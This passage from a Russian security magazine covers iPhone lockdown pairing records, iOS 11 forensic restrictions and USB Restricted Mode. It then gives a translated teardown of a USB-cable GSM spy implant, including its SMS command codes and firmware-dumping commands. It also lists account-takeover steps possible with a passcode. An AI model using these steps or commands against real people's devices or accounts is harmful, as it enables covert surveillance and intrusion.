ДОВЕРИТЕЛЬНЫЕ ОТНОШЕНИЯ И LOCKDOWN-ФАЙЛЫ
В начале этой статьи я писал, что с заблокированного iPhone, подключенного
к неизвестному компьютеру, без пароля блокировки не получится вытащить
даже фотографии. Это действитель но так: в отличие от большинства устрой‐
ств, работающих под управлением других систем, одного лишь физического
подклю чения недостаточно. Для того чтобы обмениваться информацией
(любой информацией, кроме самой базовой — вроде серийного номера
устройства и версии iOS), iPhone и компьютер должны установить так называ‐
емые доверительные отношения.
  На поверхности это выглядит как подтверждение запроса «Trust this com‐
puter?» на экране iPhone. В момент уста новления доверительных отношений
на iPhone (именно внутри самого устрой ства) создается пара криптогра‐
фических ключей. Одна часть будет храниться в самом устройстве, а другая
передана на компьютер, который сохранит ее в виде фай ла — так называ‐
емого lockdown-файла, или iTunes pairing record. Только пос ле этого станет
возможен полноценный обмен данными меж ду iPhone и компьютером.
  Прояснив этот момент, перейдем от фотографий к анализу данных iPhone.
  Самый распространенный в силу сво ей универсальнос ти способ анализа
устройств под управлением iOS — так называ емое логическое извлечение
данных. Под логическим извлечением обычно подразумевают создание
на компьютере  свежей резервной  копии  iPhone. Сделать  это можно
при помощи как специализированного прог раммного обеспечения (Elcomsoft
iOS Forensic Toolkit), так и iTunes (впрочем, полиция этот вариант использует
редко, поскольку синхрониза ция с iTunes всег да двус торонняя). При правиль‐
ном подходе такая резервная копия может содержать огромный массив
информации, вклю чающий в себя и данные большинс тва приложений,
и пароли пользователя от веб‐сайтов, социальных сетей и учетных записей.
  Возвращаемся к lockdown. Логично, что для соз дания локальной резер‐
вной копии iPhone нужно подключить к компьютеру, а точнее — к авторизо‐
ванному, «доверенному» компьютеру. Получа ется, полицейскому эксперту
каждый раз нужно разблокировать iPhone и подтверждать запрос на установ‐
ление доверительных отношений?
  Не сов сем. При том, что для обмена данными между устройствами необ‐
ходимы обе половин ки клю ча, вторую половин ку — lockdown‐файл — можно
извлечь из компьютера и использовать на любом другом компьютере. Имен‐
но так работают кримина лис тические приложения, например Elcomsoft iOS
Forensic Toolkit.





                 Содержимое lockdown‐файла

А что, если такой записи нет?
   Если компьютер не авто ризо ван (lockdown‐файл отсутствует), то соз дать
резервную копию устрой ства на нем невоз можно; для ее создания потребу‐
ется предварительно установить доверительные отношения. В предыдущих
версиях  iOS  для  это го  достаточно  было  раз блокировать  устройство
при помощи пароля или датчика отпечатков паль ца и подтвердить запрос
«Trust this computer?», но с выходом iOS 11 все изменилось.


IOS 11: ПАРОЛЬ БЛОКИРОВКИ ДЛЯ УСТАНОВЛЕНИЯ
ДОВЕРИТЕЛЬНЫХ ОТНОШЕНИЙ
Как‐то раз мне довелось общаться с группой канадских полицейских. Когда
зашла речь о методах их работы, полицейские с удовольстви ем продемонс‐
трировали свои действия в случаях, когда им хочется получить от свидетеля
разблокированный смартфон, но официального ордера пока нет. Уве ренным
тоном дается команда: выдать телефон. А теперь — разблокировать! «Глав‐
ное — сде лать это не поз днее чем через десять минут после происшес‐
твия, — говорят полицейские. — Потом они начина ют соображать, задавать
вопросы… так что нужно успеть, пока они еще под впе чатлением». Получив
в руки разблокированный телефон, полицейский его уже не выпустит.
При грамот ных действиях сот рудника полиции телефон будет изолирован
от  сети, а его настройки поменяют  так, чтобы он не заблокировал ся
по тайм‐ауту. В особо важных случаях полиция выделяет сотрудника, единс‐
твенной задачей которо го будет сидеть и периодически касаться экрана,
не давая телефону «уснуть» и заб локировать экран (так поступают тогда, ког‐
да в смартфон установлена внешняя политика безопасности, отменяющая
возможность запрета автоблокировки).





            Отклю чение авто матической блокировки iPhone

Что происходит дальше? Телефон транспортиру ется в лабораторию в раз‐
блокированном состоянии и подклю чает ся к компьютеру. Устанавливаются
доверительные отношения (Trust this computer?), снимается локальная резер‐
вная копия, извле кают ся фотографии и файлы при ложений. Обрати вни‐
мание: все это проделывается, когда смартфон был получен и разблокирован
без соответствующего ордера, — здесь действу ет слово полицейского «вла‐
делец согласился выполнить мою просьбу» (да‐да, то тре бование, высказан‐
ное приказным тоном, — это была всего лишь прось ба!).
  Именно этот сценарий решили пресечь специалис ты по безопасности
Apple.
  Важным ограничением, введенным Apple в самой первой версии iOS 11,
стало новое условие для установления доверительных отношений. Начиная
с iOS 11.0 для создания lockdown‐записи недос таточно раз блокировать
устройство и подтвердить запрос «Trust  this computer?»; система допол‐
нительно потребует ввести пароль блокировки устрой ства. Если пароль неиз‐
вестен, то и доверительные отношения уста новлены не будут.
  В чем‐то это требование логично; оно может защитить данные поль‐
зователя, когда телефон оставлен разблокированным или передан в разбло‐
кированном состоянии из рук в руки. Кроме того, требование ввести пароль
поможет очнуться поль зователям, при выкшим подтверждать все всплы‐
вающие запросы. А вот полицейско му эксперту для создания резервной
копии теперь потребуется узнать пароль блокировки устройства. Альтер‐
натива — доступ к компьютеру пользователя, с которого, возможно, удастся
извлечь и использовать существующий lockdown‐файл.
  Следующей целью в противостоянии правоохранительным органам стал
второй сце нарий, использующий lockdown‐запись.


ЭВОЛЮЦИЯ IOS 11: ПОСЛЕДОВАТЕЛЬНОЕ ОГРАНИЧЕНИЕ СРОКА
ДЕЙСТВИЯ LOCKDOWN-ЗАПИСЕЙ
Как мы выяснили, обой ти обязательное требова ние ввести пароль блокиров‐
ки при подключении устройства iPhone или  iPad  к компьюте ру можно
при помощи lockdown‐записи, извлеченной из компьютера пользовате ля.
Вплоть до 11‐й версии iOS огра ничений на использование таких записей
не было. Lockdown‐файл, однажды извлеченный из компьюте ра, мог быть
успешно применен спус тя недели и месяцы. Этим фактом вовсю поль‐
зовалась полиция: от получения ордера до сня тия образа жестких дис ков
и извлечения lockdown‐файла обычно проходили недели, если не месяцы.





  Использование lockdown‐файла для извлечения информации из iPhone

В iOS 11 раз работчики Apple ввели огра ничения на срок действия lockdown‐
записей. В ранних сборках iOS 11 срок действия lockdown‐записей не рег‐
ламентировался и не документировался компанией. В дальнейших обновле‐
ниях определился срок действия lockdown‐записей: теперь их можно было
использовать в течение двух недель пос ле создания (обрати отдельное вни‐
мание: время отсчитывалось имен но с момента соз дания lockdown‐записи
при установлении доверитель ных отношений с компь ютером).
  В бета‐версиях iOS 11.3 компания дополнитель но ужесточила политику
безопасности, одновременно «уза конив» и документировав срок действия
lockdown‐записей. Начиная с iOS 11.3 beta lockdown‐файлы будут действо‐
вать в течение семи дней с момента создания. Впрочем, к релизу iOS
11.3 семидневный срок годности lockdown отыграли назад, использовав
вместо этого альтернативный защит ный механизм; очевидно, компания
до сих пор в поиске оптимального срока дей ствия lockdown.
   Что это означает на практике? Для пользователя это означает небольшое
дополнительное неудобс тво: раз в нес колько недель при подключении iPhone
к компьютеру придется заново подтверждать запрос «Trust this PC?» и вво‐
дить на телефоне пароль блокировки. А вот полицейский эксперт вынужден
будет  поторопиться  с  получением  всех необходимых  разрешительных
документов, что бы успеть вовремя изъ ять компьютер, снять образы жестких
дисков  и  восполь зовать ся  существующими  lockdown‐записями,  чтобы
получить доступ к содержимому телефона.
   Если семидневный срок годности lockdown‐записей все же войдет в сос‐
тав iOS (напомним, сейчас lockdown‐записи живут порядка двух недель),
у эксперта будет максимум семь дней (фактичес ки — меньше, так как точное
время создания доверитель ных отношений неизвес тно) для того, чтобы
извлечь lockdown‐файл с компь ютера и восполь зоваться им для логического
извлечения данных. Если же пользователь давно не подключал iPhone
к компьютеру, то lockdown‐запись и вовсе ничем не поможет.
   Очень похоже, что этот шаг был предпринят компанией Apple с единс твен‐
ной целью — противодействовать методам работы правоохранительных
органов, которые могут быть весь ма нетороп ливы по объ ективным причинам
(необходимость получения разрешительных документов, длительные задер‐
жки и завалы в лаборатории).
  Однако на этом компания не оста новилась.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
     ПРОСТО БИЗНЕС
                      КАК APPLE ЗАЩИЩАЕТ ДАННЫЕ
            СВОИХ ПОЛЬЗОВАТЕЛЕЙ, ПРЕПЯТСТВУЯ
            РАБОТЕ ПРАВООХРАНИТЕЛЬНЫХ ОРГАНОВ





IOS 11.4: ОТКЛЮЧЕНИЕ ОБМЕНА ДАННЫХ ЧЕРЕЗ USB RESTRICTED
MODE?
Как мы выяснили, lockdown‐записи ста новятся бес полезными через одну
или две недели с момента создания. Таким образом, если пароль блокировки
устройства неизвестен, невоз можным ста новится самый простой и удобный
способ анализа — логический, через соз дание резервной копии.
  Минуту! Пароль блокировки? Пасскод, или пароль блокировки устрой‐
ства, — основной и чуть ли не единс твенный барьер, охраняющий поль‐
зователя  от  зло умышленников.  Если  злоумыш леннику  станет  известен
пароль, он легко сможет про делать целый ряд замечательных вещей (о них
мы писали в статье «Что мож но сделать с iPhone, зная пасскод. Как сливают
данные, уводят iCloud и блокиру ют остальные устройства»):
 • отвязать iPhone от iCloud и отклю чить функцию Find my iPhone;
 • вклю чить двухфакторную аутентификацию (если она была отключена)
   или использовать устройство для генерации валидного кода, если она
  была активирована;
 • сбросить пароль на резервные копии, подключить телефон к компьютеру,
   создать и расшифровать резервную копию;
 • узнать все сохраненные на устройстве пароли (для этого на резервную
   копию, пароль к которой мы только что сбросили, нужно будет установить
   новый, известный пароль);
 • сменить пароль от учетной записи пользователя Apple ID;
 • скачать всю информацию из iCloud, включая пароли из iCloud Keychain,
   облачные резервные копии, фотографии и синхронизированные данные
   (да‐да, всего лишь с паролем бло кировки устройства — пароль от iCloud
   не нужен!);
 • дистанционно заблокировать или сбросить  к заводским настрой кам
  любое устройство Apple, привязанное к текущей учетной записи (име ются
   в виду другие устрой ства того же пользователя).





            Как сбросить пароль на резервную копию в iOS 11





      Сбрасываем пароль к iCloud при помощи пароля блокировки





          Меняем пароль к Apple ID при помощи пас скода

Как видишь, в Apple перешли с комплексной многос лойной защиты (iOS 8–
10)  к  простейшей  одноранговой  системе,  завязанной  исключительно
на пароль блокировки устройства. Взломал пароль от любого устройства
пользователя — получил полный доступ к данным как текущего устройства,
так и любого другого, привязанного к той же учетной записи. Вместо того
чтобы возвращаться к уже сданной в утиль системе многоуровневой защиты,
в Apple пытаются усилить соп ротивляемость ко взло му того единственного,
что осталось, — пароля блокировки.
   Итак, если вся проб лема лишь в том, чтобы узнать пароль блокировки
устройства, — нет ли воз можнос ти его как‐то взло мать?
  Именно  такие решения предос тавили правоохранительным  органам
Северной Америки (и нес кольких дру гих регионов, в число которых Россия
не входит) компании Cellebrite и Grayshift. Обе компании готовы помочь пра‐
воохранительным органам (и только им) взломать пароли устройств iPhone
и iPad методом прямого перебо ра (в случае буквенно‐циф ровых паролей —
атаки по словарю).
  Решения двух компаний кардинально отличаются. Cellebrite предлагает
услугу в виде сервиса, а телефон требуется отпра вить в офис компании,
с соответствующими рисками и юридическими вопросами. В то же время
Grayshift поставляет пра воохранительным органам США и Канады готовый
аппаратно‐программный комплекс GrayKey, поз воляющий полиции взла‐
мывать пароли устрой ств без необходимости их куда‐либо отправлять. Оба
решения  используют  неизвестные  уяз вимос ти  для  того,  чтобы  начать
перебор и обойти защиту Secure Enclave, который включает задержку в одну
минуту после пяти неудачных попыток и блокировку телефона после десяти
попыток. Обращаем внимание на то, что для работы обоих решений доступ
к lockdown‐записям не нужен — дос таточно лишь наличия активного соеди‐
нения по протоко лу USB.
  Именно для противо действия этим решениям Apple в оче редной раз
модифицировали iOS. В бета‐версии iOS 11.3 появил ся новый режим USB
Restricted Mode, который на аппа ратном уровне блокировал обмен данными
по протоколу USB между устройством iPhone или iPad и любым другим
устройством, подключенным к нему через порт Lightning. Блокировка нас‐
тупала через семь дней с момента последней раз блокировки устройства —
то есть обычному человеку, ежедневно использующему устройство, она никак
не мешала. Для того что бы снять блокировку, необ ходимо разблокировать
устройство исклю чительно при помощи пароля блокировки (не биометричес‐
кого датчика). Отдельно отметим, что новый режим можно было отключать
в устройствах с установленной внешней полити кой безопасности.


             INFO

                   В окончательную версию iOS 11.3 режим USB Re‐
                             stricted Mode не включен. Некоторые признаки
                       позволяют предположить, что режим USB Re‐
                             stricted Mode может попасть в окончательную
                       версию iOS 11.4. Пока нет достоверной информа‐
                      ции о том, войдет ли новый режим в состав
                      финальной сборки iOS 11.4 или нет.


Официальное описание ограничения сформулировано в Release Notes iOS
11.3 beta следующим обра зом:



      To improve security, for a locked iOS device to communicate with USB ac-
       cessories you must connect an accessory via lightning connector to the
       device while unlocked — or enter your device passcode while connected —
        at least once a week.

Нововведение — прямой удар по бизнесу Cellebrite и Grayshift, решениям
которых необходимо установить соединение между устройством и компьюте‐
ром, чтобы взломать пароль блокировки. Если для того, чтобы начать про‐
цедуру взлома пароля, потребуется этот самый пароль ввес ти, оба решения
станут совершенно неэффективными. В большей мере может пострадать
Cellebrite, которая требует отправки смартфона в офис компании, что
занимает дополнительное время: можно просто‐напросто не успеть.
  В чем отличие нового ограничения от появившегося в ранних версиях iOS
11 ограничения на срок действия lockdown‐записей? Сведем информацию
в краткую табличку.


                 Lockdown-запись

                 Логичес кому анализу (созданию резервной копии),
 Противодействует
                    если пароль неиз вестен

                  Пос ле  выключения  питания  или  перезагрузки
                     устрой ства   его   необ ходимо   разблокировать
 Ограничения       паролем; в противном случае логичес кий анализ
                    невозможен из‐за использования полнодискового
               шифрования

                    iOS 11.0–11.2.1, 11.3 релиз, 11.4 бета: до 14 дней
                    с момента установления доверительных отношений;
 Срок действия
                    iOS 11.3 бета: 7 дней с момента установления
                   доверитель ных отношений

                В iOS 11 — разблокиро вать устройство, подтвердить
 Как создать         запрос «Trust this computer?», ввести пароль бло‐
                    кировки устройства


               USB Restricted Mode

                   Взло му  пароля  блокировки  методами  Cellebrite
 Противодействует
                   и Grayshift

 Ограничения      Неизвестны

                  Ог раничение вступает в силу спустя 7 дней с момен‐
                      та пос ледней разбло кировки устройства (пока не до
                    конца ясно, учитыва ются ли только разблокировки
 Срок действия
                   паролем или также биомет рическим датчиком); воз‐
                   можно, учитыва ется и время последнего под клю‐
                    чения к авторизованному устройству

                  Подключить к доверен ному устройству и оставить
 Возможные
                   подключенным (необ ходимо дополнительное тес‐
 методы обхода
                    тирование)

Еще раз отметим, что режим USB Restricted Mode впервые появился в тес‐
товой сборке iOS 11.3 Beta и не включен в окон чательную версию iOS
11.3. Этот режим может войти в окончательную версию iOS 11.4 — но может
и не войти, о чем на данный момент дос товерной информации нет. А что
есть?
  На сегодняшний день в нашем рас поряжении имеется пос ледняя бета iOS
11.4. В бета‐версию 11.4 новый режим USB Restricted Mode вошел не пол‐
ностью, а точнее — он включен в более мягком режиме. Что же произой дет
через семь дней бездействия с iPhone, на который установлена iOS 11.4 beta?
Мы протестировали iPhone с iOS 11.4, для которого была создана свежая
lockdown‐запись.
  Наши действия:
 1. iPhone подклю чен к компь ютеру, подтверждено установление доверитель‐
   ных отношений; создан и извлечен свежий lockdown‐файл.
 2. iPhone отключен от компь ютера и подключен к зарядному устройству.
 3. Спустя семь дней мы попробовали подключить телефон к компьютеру.

В результате мы обнаружили следующее. Через неделю при подключении
телефона к компьютеру iTunes выда ет такое сооб щение: «iTunes could not
connect to the iPhone “name” because it is locked with a passcode. You must enter
your passcode on the iPhone before it can be used with iTunes».
  Мы подключили lockdown‐файл в при ложении Elcomsoft iOS Forensic Tool‐
kit, попытавшись получить доступ к различным сервисам iOS. Результат:
 • Базовая информация об устройстве: ДОСТУПНО
 • Расширенная информация об устрой стве, вклю чая список приложений:
  НЕДОСТУПНО
 • Сервис AFC (для доступа к файлам приложений): НЕДОСТУПЕН
 • Сервис backup (для соз дания локальной резервной копии): НЕДОСТУПЕН
 • Медиасервис (для доступа к фотографиям): НЕДОСТУПЕН

Таким образом, спустя семь дней бездей ствия iOS 11.4 beta отключила дос‐
туп ко всем релевантным сервисам iPhone, позволяющим извлечь сколь‐
ко‐нибудь значимую информацию об устрой стве. Что же произойдет, если мы
введем на телефоне пароль бло кировки, как нам рекомендует это сде лать
iTunes? Мы разбло киро вали телефон и вос пользовались той же самой lock‐
down‐записью. Результат:
 • Базовая информация об устройстве: ДОСТУПНО
 • Расширенная информация об устрой стве, вклю чая список приложений:
  ДОСТУПНО
 • Сервис AFC (для доступа к файлам приложений): ДОСТУПЕН
 • Сервис backup (для соз дания локальной резервной копии): ДОСТУПЕН
 • Медиасервис (для доступа к фотографиям): ДОСТУПЕН

Делаем вывод: lockdown‐файл остался дей ствителен, все релевантные сер‐
висы доступны. Отсоединяем телефон от компьютера, подключаем к заряд‐
ному устройству и ждем еще семь дней. Вновь подключаем телефон к компь‐
ютеру. iTunes выдает сообщение, предлага ющее уста новить связь с телефо‐
ном — так, как будто он подключен к компьютеру впервые. Запускаем iOS
Forensic Toolkit и пытаемся вос пользовать ся все той же lockdown‐записью,
возраст которой перева лил за четырнадцать дней. Результат:
 • Базовая информация об устройстве: ДОСТУПНО
 • Расширенная информация об устрой стве, вклю чая список приложений:
  НЕДОСТУПНО
 • Сервис AFC (для доступа к файлам приложений): НЕДОСТУПЕН
 • Сервис backup (для соз дания локальной резервной копии): НЕДОСТУПЕН
 • Медиасервис (для доступа к фотографиям): НЕДОСТУПЕН

Разблокируем телефон паролем блокировки и повторяем попытку, используя
все ту же lockdown‐запись. Результат не изменился. Вывод: дело в самой
lockdown‐записи, у которой прос то истек срок действия.


ЭКСПЕРТНАЯ ОЦЕНКА
По мнению автора, эффект от нововведений ожидается… неоднозначный.
Так, ограничение срока действия lockdown‐записи не только обезопасит
пользователя от возможных атак (в том числе таких, которые предприняты
злоумышленником, когда разблокированный телефон оставлен без прис‐
мотра), но и создаст дополнитель ные неудобства при регулярном проводном
подклю чении iPhone к таким устройствам, как док‐станции и портативные
аудиосистемы.
  Предназначение режима USB Restricted Mode, блокирующего передачу
данных через USB‐порт устройства, очевидно: воспре пятствовать работе
правоохранительных орга нов, которые могут попытаться разблокировать
iPhone или iPad при помощи решений Cellebrite, Grayshift и их аналогов.
С некоторой натяжкой можно представить сценарий, когда телефон у поль‐
зователя изымается преступной груп пировкой, которая переправит устрой‐
ство в подпольную лабора торию (до это го момента сценарий впол не реалис‐
тичен) и попытается взломать пароль блокировки с помощью технических
средств. Против этой версии выступает тот факт, что соответству ющие тех‐
нические решения существу ют на данный момент в еди ничных экземплярах
и поставляются исключитель но пра воохранительным органам некоторых
государств.
  Режим USB  Restricted Mode — решение по‐своему гениальное: его
использование  позволяет  заметно  повысить  безопасность  устройств,
при этом нисколько не уменьшая удобства работы. Тем не менее Apple мед‐
лит с его внедрением в официальную сборку iOS — вероятно, осознавая воз‐
можные неприятные пос ледствия со стороны американского регулятора
и реакцию правоохранительных орга нов. В ситуации, когда очередная воз‐
можность системы поможет пользователям устройств Apple обезопасить
себя лишь от претензий пра воохранительных органов, нам сложно составить
однозначное мнение о ее зна чимос ти с социальной точки зрения.
   Что еще ожидается в iOS 11.4? Помимо стандартного списка исправлений
и улучшений, в новой версии мобильной ОС должен появиться обещанный
еще в анонсе iOS 11 режим полноценной синхро низации сообщений iMes‐
sage с облаком iCloud. Как это будет работать и какую пользу может принес ти
для полиции — в одной из следующих статей.
 ТРЮКИ

ВСКРЫВАЕМ
ХАРДВЕРНЫЙ
ИМПЛАНТ





                            КАК УСТРОЕН
                  ДЕВАЙС ДЛЯ СЛЕЖКИ,
                   ЗАМАСКИРОВАННЫЙ
                    ПОД КАБЕЛЬ USB





  Крошечные жучки с SIM‐картой внутри, спо‐
  собные передавать голос и отслеживать
  местоположение, можно встроить в любую
  элек тронику, в том числе — в обычный про‐
  вод. В образовательных целях мы рас‐
                                                                               0x6d696368  потрошим такое устройство, изучим его                                                                                          Computer magician
  прошивку,   найдем   скрытые   команды
  и обнаружим, как он молча шлет данные
  на китайский сервис. Который еще и ока‐
  зался уязвимым! Но обо всем по порядку.


               INFO

                         Это перевод статьи Inside a low budget consumer
                           hardware espionage implant. Переводчик — Андрей
                        Письменный.  Материал  публикуется  с  раз‐
                        решения авто ра.


  Какое‐то время назад Джо Фитц на писал в твиттере об устройстве под наз‐
  ванием S8 data line locator и назвал его «просачивающимся шпионажем»
   из‐за того, что он похож на шпионское оборудование АНБ.
     S8 data  line locator — это подслу шива ющее устройство, снабженное
  модулем GSM, которое умещается в штепселе обычного кабеля USB
  для зарядки и передачи данных. Оно поддерживает частоты GSM 850, 900,
  1800 и 1900 МГц.
     Идея, лежащая в основе, очень напоминает продуктовую линейку COT‐
  TONMOUTH, выпускаемую по заказу АНБ и CSS, — там радиопередатчик
  тоже спрятан в вилку USB (см. утекший отчет на cryptome.org — PDF). Такие
  устройства называют имплантами.
    Само устройство рекламируется как трекер геолокации, который можно
  использовать в машине: угонщик не примет кабель USB за маячок. Но сложно
  не заметить и возможность применения такого устройства во вред. Особен‐
  но учитывая, что точ ность определения геокоординат очень примерная (в
  моих тестах погрешность составляла 1,57 км). Зато можно позвонить на него
  и слушать аудио, переда ваемое малень ким микрофоном, находящимся внут‐
   ри. Либо устройство само может поз вонить, если определит, что звук пре‐
  вышает предел в 40–45 дБ. Ну и совсем никаких сомнений в том, что шпи‐
  онаж — основное применение это го гаджета, не остается, если учесть, что
  оно легко запаковывается обратно в фаб ричную упаковку после установки
  SIM‐карты и настрой ки.





 ВОЗМОЖНОСТИ S8 DATA LINE LOCATOR

  У устройства есть несколько воз можнос тей для подслушивания и шпионажа.
  Только взгляни на лог переписки с устройством по SMS.





  Под слу шивание
  Если звонить на S8 data line locator в течение десяти секунд, будет установ‐
  лено соединение, и ты услышишь все, что слышит микрофон внутри устрой‐
   ства.


  Об ратный зво нок
  SMS с текстом 1111 на устройство активирует обратный звонок. В под‐
  тверждение этого придет SMS с ответом:


  DT: Set voice monitoring, voice callback and sound sensitivity:400

  Как только уровень звука поднимется до 40 дБ, устройство перезвонит на тот
  номер, с которо го была прислана команда.
     Для отключения обратного звонка нуж но отпра вить SMS с кодом 0000.
  Ответ будет выглядеть так:


  DT: Voice monitoring cancelled successfully.


  Запрос геопо зиции
  В инструкции написано, что, если отправить по SMS команду dw, устройство
   в ответ пришлет информацию о своем мес тоположении. Выглядит это так:


  Loc:Street, ZIP City, Country
  http://gpsui.net/u/xxxx Battery: 100%

  Вместо xxxx будут символы 0–9, A–Z, a–z, а вместо строки Street, ZIP
  City,  Country — название улицы, почтовый индекс, город и страна.
  По ссылке на http://gpsui.net можно перейти без авторизации, она перенап‐
  равит на Google Maps.
    Получить местополо жение с погрешностью мень ше чем в 1,57 км у меня
  ни разу не вышло.
    Делая запрос, устрой ство использует мобильный трафик для доступа
   к неизвестному эндпойнту (предположительно gpsui.net). Это подтвержда‐
   ется тем, что мой оператор снял с меня деньги за MMS/Internet. Разницы
  между MMS и использованием интернета он не указывает, но я беру на себя
  смелость предположить, что запрос был сделан во время опре деле ния мес‐
  тоположения. Именно это и стало отправной точкой для моего анализа.


             WARNING

                        Поскольку устройство отправляет неизвестные
                         данные неизвестной третьей сто роне, его нельзя
                            (по крайней мере, с чистой совестью) исполь‐
                           зовать в пен тестах. Как минимум из тех сооб‐
                          ражений, что устройство уже могло быть в экс‐
                           плуатации.


  Дальше я попытался проанализировать и уничтожить эту «фичу» с отсту ком
   куда‐то.



 ЖЕЛЕЗО

  Чтобы получить доступ к внут ренностям устройства, сначала нужно снять
  метал лическую защиту коннектора USB.





  Теперь снимаем пластиковую крышку.





  Чипы
  После вскрытия устрой ства определяем, что за чипы на нем установлены.





  Обнаруживаем:
   • MediaTek MT6261MA — низкобюджетный чип, который часто исполь‐
      зуется в умных часах китайского производс тва. Никакой официальной
     документации или информации о чипе компания MediaTek не публиковала;
   • RDA 6626e — «мощный, высоко эффективный четырехканальный фрон‐
     тэнд‐модуль… созданный для установки в мобильные устройства с под‐
     держкой сетей GSM850, EGSM900, DCS1800, PCS1900».


  Кон некто ры
  Я идентифицировал три разных способа подклю чить ся к устройству.


  USB (сквоз ной)
  Коннекторы USB A и Micro‐B не подсоеди нены к MT6261MA. Они просто
  передают сигнал от одного к другому.





  UART
  Следующее соединение — это UART.





  Соединение с ним занимает примерно три секунды пос ле загрузки устрой‐
   ства.


  screen /dev/ttyUSB0 115200 # 8N1
  F1: 0000 0000
  V0: 0000 0000 [0001]
  00: 1029 0001
  01: 0000 0000
  U0: 0000 0001 [0000]
  G0: 0002 0000 [0000]
  T0: 0000 0C73
  Jump to BL
  ~~~ Welcome to MTK Bootloader V005 (since 2005) ~~~
  **===================================================**
  Bye bye bootloader, jump to=0x1000a5b0




                                        Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
         ВСКРЫВАЕМ
 ХАРДВЕРНЫЙ ИМПЛАНТ
                  КАК УСТРОЕН ДЕВАЙС ДЛЯ СЛЕЖКИ,
              ЗАМАСКИРОВАННЫЙ ПОД КАБЕЛЬ USB




Вывод на этом обрывается, а ввод игнорируется.
   Похоже, существует другая версия про шивки, которая может обрабаты‐
вать модемные команды AT. В приветствии этой альтернативной прошивки
упомянут некто ZhiPu. Я тоже натыкался на эту строку, когда изучал файловую
систему FAT12 прошивки, так что какая‐то связь определенно есть.
   Вот как выглядит вывод у схожего устрой ства.


F1: 0000 0000
V0: 0000 0000 [0001]
00: 1029 0002
01: 0000 0000
U0: 0000 0001 [0000]
G0: 0002 0000 [0000]
T0: 0000 0C73
Jump to BL
~~~ Welcome to MTK Bootloader V005 (since 2005) ~~~
**===================================================**


Bye bye bootloader, jump to=0x1000a5b0
LOG: RegisterSn:
LOG: ZhiPu_sock_buf_init malloc= 217780, 217180, 216940
LOG: ZhiPu_mmi_get_imsi_request
LOG: ZhiPu_system_init VERSION= MTK6261M.T16.17.01.10 , build date
is 2017/01/10 17:33, curtime 2004‐01‐01 00:00
LOG: g_zhipu_imei= \
LOG: ‐‐‐‐‐ 0 ‐‐‐‐‐  ‐‐‐‐‐ ‐268081676 ‐‐‐‐‐  ‐‐‐‐‐ 2 ‐‐‐‐‐
LOG: ZhiPu_sms_ready_sync
LOG: ZhiPu System Language: English
LOG: service_availability= 0,ChargerConnected= 1,poweron_mode= 0
LOG: sim invalid, 4 minutes later reboot
LOG: ‐‐‐‐‐ 0 ‐‐‐‐‐  ‐‐‐‐‐ 83 ‐‐‐‐‐  ‐‐‐‐‐ 2 ‐‐‐‐‐
LOG: idle_screen_network_name:Same IMEI



USB (MTK)

Контакты DP и DM коннектора USB не подсоединены к линиям D+ и D‐, зато V
и GND подсоединены. DP и DM вместо этого подведены к MT6261MA,
как показано на картинке.





Припаиваем кабель USB к коннекторам.





Теперь устройство будет распозна вать ся как телефон MediaTek, подключен‐
ный по USB.


ID 0e8d:0003 MediaTek Inc. MT6227 phone

Этот метод часто называ ют «почин кой бута MTK», «флешем MTK DM DP» и так
далее. Он позволит нам общать ся с устройством и сделать дамп ПЗУ
и флеш‐памяти прошив ки.



ДАМП ПРОШИВКИ

Чтобы дампить прошивку, я чаще всего исполь зую опенсорсную исследова‐
тельскую ОС Fernvale. Изна чально она делалась для работы с чипом MT6260,
но позже ее адаптировали для MT6261MA.


        WWW

                     Подробнее о Fernvale ты можешь узнать из док‐
                       лада bunnie и xobs на 31‐м CCC, он называется
                            «Fernvale:   открытая   хар дверная   платформа
                       на основе (номинально) зак рытого чипа mT6260».
                        Есть слайды в PDF и видео.



Скачиваем нуж ную ветку fernly
Для начала скачиваем подходящую вер сию Fernvale — это форк, соз данный
пользователем urjaman (Urja Rannikko) и работающий с MT6261.


$ git clone https://github.com/urjaman/fernly
$ git clone https://github.com/robertfoss/setup_codesourcery.git
$ sudo setup_codesourcery/setup.sh
$ /usr/local/bin/codesourcery‐arm‐2014.05.sh
$ cd fernly
$ git checkout fernly6261
$ make CROSS_COMPILE=arm‐none‐eabi‐
$ exit
$ cp 95‐fernvale‐simple.rules /etc/udev/rules.d/.


Дамп ПЗУ
Теперь можем делать дамп ПЗУ. Для этого выполняем:


$ echo "data = [" > rom.py
$ fernly/build/fernly‐usb‐loader /dev/fernvale fernly/build/
dump‐rom‐usb.bin >> rom.py
$ echo "
]
f = open('rom.bin','wb')
for s in data:
f.write(chr(int(s,16)))
f.close()
" >> rom.py
$ python rom.py

Теперь файл rom.bin будет содержать дамп ПЗУ устройства (по крайней
мере, если верить документации в репозитории fernly).

Дамп флеш‑памяти
Чтобы сде лать дамп флешки, нужно про пат чить ﬂash ROM.


$ git clone https://github.com/flashrom/flashrom
$ cd flashrom/
$ git checkout c8305e1dee66cd69bd8fca38bff2c8bf32924306
$ patch ‐p0 < ../fernly/flashrom‐fernvale.patch

Без приключений патч не вста ет, так что придет ся вручную поправить мей‐
кфайл (Makeﬁle.rej). Когда закончишь с этим, можно загружать прошивку
в оперативную память, написав:


$ fernly/build/fernly‐usb‐loader ‐w /dev/fernvale fernly/build/
stage1.bin fernly/build/firmware.bin

Теперь можем использовать программатор fernvale_spi, который мы пат‐
чем превратили во ﬂash ROM. Для начала даем ему опознать флеш сле‐
дующей командой:


$ flashrom/flashrom ‐‐programmer fernvale_spi:dev=/dev/fernvale

А теперь читаем флеш:


$ flashrom/flashrom ‐‐programmer fernvale_spi:dev=/dev/fernvale ‐c
"MX25L3205(A)" ‐‐read flash.dat

Содержимое флеш‐памяти устройства ока жется в файле flash.dat.


По пытка записать флеш
Запись производится вот такой командой:


$ flashrom/flashrom ‐‐programmer fernvale_spi:dev=/dev/fernvale ‐c
"MX25L3205(A)" ‐‐write flash.dat

Но флеш защищен от записи, и бит защиты нельзя отключить через ﬂashrom.
Других возможных способов отключить защиту я пока не нашел.
   На альтернативной версии устройства вывод ﬂashrom выглядит сле‐
дующим образом:


$ flashrom/flashrom ‐‐programmer fernvale_spi:dev=/dev/fernvale
flashrom v0.9.9‐86‐ge1a960e‐dirty on Linux 4.13.2‐1.el7.elrepo.
x86_64 (x86_64)
flashrom is free software, get the source code at https://flashrom.
org
Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns).
